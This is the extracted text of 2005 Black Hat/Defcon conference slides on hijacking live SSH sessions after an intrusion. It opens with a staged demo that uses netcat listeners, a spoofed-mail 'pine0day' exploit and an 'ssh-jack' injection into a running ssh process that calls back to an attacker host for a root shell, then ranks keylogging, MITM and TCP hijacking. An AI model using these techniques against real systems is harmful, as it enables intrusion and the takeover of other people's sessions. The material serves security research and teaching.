Trust Transience: 
Post Intrusion SSH Hijacking
July 2k5 - Blackhat USA 05 &
Defcon 0x0D
So you're a sneaky Blackhat...
The Target
Recon
● Mail headers say MUA 
is PINE
● .sig says Debian Sarge, 
kernel 2.4.22
● Web logs show egress 
HTTPS traffic doesn't go 
via a proxy (no 
forwarded-for header)
The Plan
Let's Do It
haxor:~$ nc -l -p 1337
admin@box:~$ id
uid=1004(admin) gid=1004(admin) groups=1004(admin)
admin@box:~$ ps auxw | grep -q pine || echo shit
shit
admin@box:~$ ls core
core
admin@box:~$ uname -nsr
Linux box 2.6.11
haxor:~$ ./pine0day | spoofmail -f 'Mr. Mbeki' -s 'Opportunity for joo!' 
PI:EMAIL
Things start to unravel
admin@box:~$ w
USER  TTY   FROM      LOGIN@ IDLE JCPU PCPU WHAT
admin pts/1 :0
09:28 10.3m 3.1s 0.2s bash
admin pts/2 :0        09:31  1.0s 1.4s 0.9s bash
admin pts/3 haxor.com 14:03  0.0s 0.3s 0.3s w
admin@box:~$ ps x
3132 ?
S
0:23 xfwm4 –-daemon –sm-client-id 34235
3590 ?
S+
0:05 xterm -rv
3593 pts/1  Ss+
0:02 bash 
3597 pts/1  S+
0:12 ssh PI:EMAIL
9034 ?
S+ 
0:03 xterm -rv
9036 pts/2
Ss+
0:02 bash
9154 pts/3 R+
0:00 ps x
+++ATH0
● Things have gone pear-shaped
● Haven't got root, are about to get busted
● Time to drop carrier and run?
● But that SSH session, oh so close. 
● If only there was a way to get to the other end of 
that SSH...
There is a way
admin@box:~$ :!!!!mafl-load ssh-jack 3597 haxor.com 1338
Connecting to /usr/bin/ssh running as pid 3597...
Connected
Ferreting out some useful symbols...
Located libc symbol 'socket' at 0xb7e19a50
Located libc symbol 'connect' at 0xb7e195c0
Located libc symbol 'select' at 0xb7e12490
Located section '.got' 0x0807eb8c to 0x0807eef4
Located section '.plt' 0x0804aa68 to 0x0804b7d8
Located section '.text' 0x0804b7e0 to 0x08070450
Located section '.rodata' 0x08070480 to 0x0807dd6c
Resolved dynamic symbol 'socket' at PLT: 0x0804b6b8 GOT: 0x0807eea8
Resolved dynamic symbol 'select' at PLT: 0x0804ad88 GOT: 0x0807ec5c
Resolved dynamic symbol 'connect' at PLT: 0x0804b5f8 GOT: 0x0807ee78
Locating stub injection point...
Phase 1: Find magic string in .rodata... 0x0807139c
Phase 2: Find where magic string is used... 0x0804d803
Phase 3: Find three jump 0x0804d800 instructions... 0x0804d6d9 0x0804d6e1 0x0804d6e9
haxor:~$ nc -l -p 1338
root@ns1:~# echo pwned!
pwned!
Intro
● I'm Metlstorm / Adam
● From New Zealand
– No, I don't know any hobbits, you 
sad Tolkien fanboi
● Work for a Linux systems 
integrator, in the past a corporate 
whore security consultant, ISP 
security guy, NOC monkey
WTF Just Happened?
● Intrusion
– MO: attack servers via the admins
– Complexity == insecurity
– Things go wrong...
– ... you can drop carrier and run...
– ... or display adaptability.
(You look like you're 
writing an SSH 
jacker...)
Post Intrusion
● Goals
– Priv escalation
– Stealth & consolidation
– Recon, further penetration
– Guerrilla; hit & fade, keep it moving
● Displaying Adaptability
– Things don't go according to plan
– Adaptability core difference between hackers and 
[skript|korporate] kiddies
(you don't want to end 
up like Markus Hess)
Cross Host Privilege Escalation
● Maybe local root is a distraction
● Yes, exploiting local vulnerabilities is easier, we 
can see stack layout, versions, etc
● But what if there were something even easier?
Trust Relationships
● Kicking it old school
– rhosts
– ports < 1024 == root
– exporting / *(rw)
● Gives you that warm apple pie nostalgia feeling
● Can you believe that we even called that hacking?
● Provides instant gratification; no waiting for user 
interaction
(when the postman knew your name, 
and no one locked their front door)
(We're all Unix hippies around 
here, share the love!)
Non-Transient Trusts
● Traditional “fixed”
trusts (rhosts, ssh trusts)
● Stored authentication 
credentials
● “One factor” auth
● Authentication based on 
connection properties 
(e.g: source IP, port)
Transient Trust
● Trust relationships 
that exist only for a 
period of time
● Open, post 
authentication 
sessions
● Unless you personally auth each packet, any cross-
priv-boundary connection has some transient trust
Exploit Metrics
● Evaluate techniques 
for exploiting trusts
● Assume that we've just 
acquired a non-root 
shell on a client 
machine
● Metrics: (value 1-10)
– Ease
– Stealth
– When
– Feasibility
Exploiting Non-Transient Trust
● Pretend to be Client A 
so the server trusts us
Ease: 
10
Stealth: 
10
When:
10
Feasibility: 2
Exploiting (Keylogging)
● During 
Authentication:
– Obtain User A's 
password
● Later:
– Impersonate User 
A
Ease: 
7
Stealth: 
8
When:
3
Feasibility: 7
Exploiting (MITM)
● During 
Authentication:
– Impersonate 
Server to Client
– Impersonate 
Client to Server
● Later:
– Monitor session
– Take over session
Ease: 
5
Stealth: 
4
When:
3
Feasibility: 5
Exploiting (TCP Hijack)
● Later:
– Predict TCP 
Sequence 
numbers
– Take over 
running session
Ease: 
3
Stealth: 
1
When:
7
Feasibility: 2
(Is it just me or does that 
look like Shimomura?)
Exploiting (Application Hijack)
● Later:
– Take control of 
network client 
application
– Sneak down 
running, 
authenticated 
session
Ease: 
8
Stealth: 
8
When:
7
Feasibility: 7
Hijack the Application
● Different MO:
– attack during peak time, while the users are there
– daylight robbery; take their root while they're using 
it...
– ...without them even noticing
● Not really very technically challenging
– just creative reapplication of tricks virii, debugging, 
binary reverse-engineering
Technique Comparison
● Transient trusts 
almost as much 
fun as the real 
thing
trusts
key-
log'n
tcp hi-
jack'n
MITM
tran
sient 
trust
0
2.5
5
7.5
10
12.5
15
17.5
20
22.5
25
27.5
30
32.5
feasibility
stealthy
when
ease
(Gentlemen, as this graph 
clearly shows, my m4d 
t3kneeq is teh b3zt!)
The SSH 'Jacker
● SSH-Jack: A Python script which gives you a 
shell at the other end of a running SSH session
– How it works
– Implementation Details
– Anti-forensics
– Mitigation
– Improvements, Direction
Rich Protocols: SSH
● Goal: Hijack session while in active use without 
detection
● Virtual Channel infrastructure makes it seamless
How it Works (I)
● Reuse the features provided by SSH...
● ... for evil
● Glue a socket to a second shell, add an Evil 
Hax0r, mix well.
How it Works (II)
● Using Python and GDB/MI it: